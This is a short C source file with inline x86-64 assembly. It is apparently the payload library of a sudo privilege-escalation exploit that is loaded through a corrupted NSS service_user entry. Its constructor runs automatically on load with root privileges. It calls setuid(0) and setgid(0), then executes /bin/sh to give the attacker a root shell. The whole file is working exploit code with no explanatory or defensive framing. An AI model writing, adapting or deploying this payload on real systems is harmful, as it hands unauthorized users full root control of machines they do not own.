/*
 * Shared library loaded via corrupted NSS service_user.
 * Constructor runs as root (sudo euid) and spawns a shell.
 */
static void __attribute__((constructor)) _init(void)
{
    __asm__ __volatile__(
        "addq $64, %rsp;"
        /* setuid(0) */
        "movq $105, %rax;"
        "movq $0, %rdi;"
        "syscall;"
        /* setgid(0) */
        "movq $106, %rax;"
        "movq $0, %rdi;"
        "syscall;"
        /* execve("/bin/sh", ["/bin/sh", NULL], NULL) */
        "movq $59, %rax;"
        "movq $0x0068732f6e69622f, %rdi;"
        "pushq %rdi;"
        "movq %rsp, %rdi;"
        "movq $0, %rdx;"
        "pushq %rdx;"
        "pushq %rdi;"
        "movq %rsp, %rsi;"
        "syscall;"
        /* exit(0) */
        "movq $60, %rax;"
        "movq $0, %rdi;"
        "syscall;"
    );
}
